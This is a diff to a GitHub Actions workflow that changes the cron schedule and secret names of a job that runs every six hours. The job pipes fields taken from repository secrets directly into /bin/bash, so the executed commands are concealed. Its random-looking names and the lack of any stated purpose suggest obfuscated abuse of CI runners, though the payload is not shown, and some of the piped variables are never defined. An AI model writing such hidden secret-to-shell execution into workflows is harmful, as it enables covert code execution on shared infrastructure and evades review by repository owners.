@@ -1,21 +1,20 @@
 name: shatongshui3439
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
-jobs:  # 25990
+    - cron: '51 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shatongshui3439
         env:
-          nwifs140: ${{ secrets.nwifs140 }}
+          ebvg753: ${{ secrets.ebvg753 }}
         run: |
-          echo $nwifs140 | jq -r .jy98 | /bin/bash
-          echo $y4214 | jq -r .zepfd1252 | /bin/bash
-          echo $nnct7746 | jq -r .osn49 | /bin/bash
-          echo $w8064 | jq -r .mfwmt953 | /bin/bash
-          echo $lk6 | jq -r .nblj12484 | /bin/bash
+          echo $ebvg753 | jq -r .zs13429 | /bin/bash
+          echo $ur81436 | jq -r .xqp6 | /bin/bash
+          echo $uq1 | jq -r .panm6914 | /bin/bash
 
